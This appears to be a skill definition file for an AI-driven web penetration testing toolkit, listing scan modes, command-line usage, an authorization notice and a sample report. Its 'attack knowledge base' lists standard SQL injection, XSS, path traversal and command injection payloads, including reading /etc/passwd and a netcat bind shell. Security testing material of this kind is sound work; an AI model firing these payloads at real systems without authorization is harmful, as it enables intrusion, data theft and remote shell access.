---
name: pentest-toolkit
description: AI-Powered Security Testing Toolkit - A comprehensive, self-contained penetration testing skill that provides professional security testing capabilities with Astral uv for enhanced Python environment management
---

# AI-Powered Security Testing Toolkit

A comprehensive, self-contained penetration testing skill that provides professional security testing capabilities with Astral uv for enhanced Python environment management. This toolkit implements the core functionality found in enterprise security testing tools with an AI-guided approach and modern Python packaging.

## Capabilities

### Core Security Testing Tools

**üîç Discovery & Reconnaissance**
- **Endpoint Enumeration** - Discover all URLs, API endpoints, and attack surfaces
- **Subdomain Discovery** - Find hidden subdomains and related assets
- **Technology Fingerprinting** - Identify frameworks, versions, and infrastructure
- **Port Scanning** - Comprehensive port and service discovery
- **Directory Brute-forcing** - Find hidden directories and files

**üéØ Vulnerability Testing**
- **SQL Injection Testing** - Blind, time-based, union-based, and error-based
- **Cross-Site Scripting (XSS)** - Reflected, stored, and DOM-based XSS
- **Command Injection** - OS command execution vulnerabilities
- **Path Traversal** - Local file inclusion and directory access
- **NoSQL Injection** - MongoDB, CouchDB, and other NoSQL attacks
- **Business Logic Flaws** - Price manipulation, workflow bypass, authorization issues
- **Authentication Bypass** - Login flaws, session management, JWT vulnerabilities
- **IDOR Testing** - Insecure direct object reference detection

**üìä Analysis & Reporting**
- **Automated Reporting** - Generate professional security reports
- **Finding Documentation** - Document vulnerabilities with severity and impact
- **Coverage Validation** - Ensure comprehensive testing coverage
- **Risk Assessment** - Prioritize findings by business impact

## Usage

### Quick Start
```bash
# Setup uv environment (optional, recommended)
./pentest-toolkit --setup

# Quick security scan
./pentest-toolkit --target https://example.com --mode quick

# Comprehensive penetration test
./pentest-toolkit --target https://example.com --mode comprehensive

# API security testing
./pentest-toolkit --target https://api.example.com --mode api

# Multi-target scanning
./pentest-toolkit --targets targets.txt --parallel 3

# Generate report from previous scan
./pentest-toolkit --report /path/to/results.json
```

### Advanced Usage with uv
```bash
# Force uv execution (recommended for isolation)
./pentest-toolkit --target https://example.com --mode comprehensive --uv

# Use system Python directly (no uv)
./pentest-toolkit --target https://example.com --mode comprehensive --no-uv

# List available execution methods
./pentest-toolkit --list-tools
```

## Attack Knowledge Base

This toolkit includes a comprehensive attack knowledge base with:

### SQL Injection Techniques
- **Boolean-based Blind**: `admin' OR '1'='1` - Tests for authentication bypass
- **Union-based**: `' UNION SELECT username,password FROM users--` - Data extraction
- **Time-based**: `' AND SLEEP(5)--` - Blind testing with delays
- **Error-based**: `'` - Triggers errors to leak database info
- **NoSQL Operators**: `{"username": {"$ne": ""}}` - MongoDB injection

### XSS Payloads
- **Basic**: `<script>alert(1)</script>` - Simple script injection
- **Event Handlers**: `<img src=x onerror=alert(1)>` - Bypass script filters
- **Attribute Breakout**: `"><script>alert(1)</script>` - Escape from attributes
- **Encoded**: `%3Cscript%3Ealert(1)%3C/script%3E` - URL encoded payloads

### Command Injection Patterns
- **Chaining**: `; whoami` - Execute additional commands
- **Pipes**: `| cat /etc/passwd` - Redirect output
- **Backticks**: `` `id` `` - Command substitution
- **Background**: `& nc -l 4444 -e /bin/bash` - Persistent access

### Path Traversal
- **Basic**: `../../../etc/passwd` - Navigate file system
- **Encoded**: `..%2f..%2f..%2fetc%2fpasswd` - URL encoded
- **Null Byte**: `../../../etc/passwd%00` - Terminate strings
- **Windows**: `..\..\..\windows\system32\drivers\etc\hosts` - Windows paths

## Implementation Details

### Astral uv Integration
The toolkit uses Astral uv for modern Python environment management:

- **Automatic Installation**: Installs uv if not available
- **Virtual Environments**: Creates isolated environments for security
- **Fast Execution**: uv's optimized package management
- **Fallback Support**: Gracefully degrades to system Python
- **Isolated Execution**: Each script runs in isolated context

### Self-Contained Scripts
Each security test is implemented as a standalone Python script:

- `scripts/enumerate_endpoints.py` - Endpoint discovery
- `scripts/test_sql_injection.py` - SQL injection testing
- `scripts/test_xss.py` - XSS vulnerability detection
- `scripts/scan_ports.py` - Port scanning
- `scripts/generate_report.py` - Report generation
- `scripts/comprehensive_test.py` - Orchestrated testing

### Modern Python Packaging
- **pyproject.toml**: Standard Python project configuration
- **uv Scripts**: Native script execution via uv
- **Package Structure**: Proper Python package layout
- **Type Safety**: Enhanced with type hints

### AI-Guided Testing
The skill uses AI to:
- Analyze responses for vulnerability indicators
- Generate contextual payloads based on application behavior
- Adapt testing strategy based on findings
- Prioritize attack vectors based on discovered technologies

## Responsible Usage

‚ö†Ô∏è **CRITICAL**: This toolkit is for authorized security testing ONLY.

- **Never test without written permission**
- **Use only on systems you own or have explicit authorization**
- **Follow responsible disclosure guidelines**
- **Comply with all applicable laws and regulations**

## Getting Started

1. **Ensure Authorization**: Have written permission before testing
2. **Choose Testing Mode**: Quick scan, comprehensive, or API-focused
3. **Review Results**: Analyze findings and understand business impact
4. **Report Responsibly**: Follow vendor disclosure policies

## Output Format

```
[+] Target: https://example.com
[+] Scan started: 2024-01-15 10:00:00

=== Discovery Phase ===
[+] Endpoints found: 12
[+] Subdomains discovered: 3
[+] Technology: Python 3.9 / Flask 2.0

=== Vulnerability Testing ===
[CRITICAL] SQL Injection in /login
    Parameter: username
    Payload: admin' OR '1'='1
    Impact: Complete database compromise

[HIGH] XSS in /search
    Parameter: q
    Payload: <script>alert(1)</script>
    Impact: Session hijacking

=== Summary ===
Critical: 1
High: 2
Medium: 5
Low: 8
```

## Customization

Users can:
- Add custom payloads to `payloads/` directory
- Modify detection rules in `patterns/` files
- Adjust testing intensity in `config.json`
- Create custom report templates

## Limitations

- Designed for web application security testing
- Does not include exploit code
- Focused on detection, not exploitation
- Requires basic Python/Unix environment

This skill provides enterprise-grade security testing capabilities while remaining fully self-contained and accessible to security professionals, developers, and penetration testers.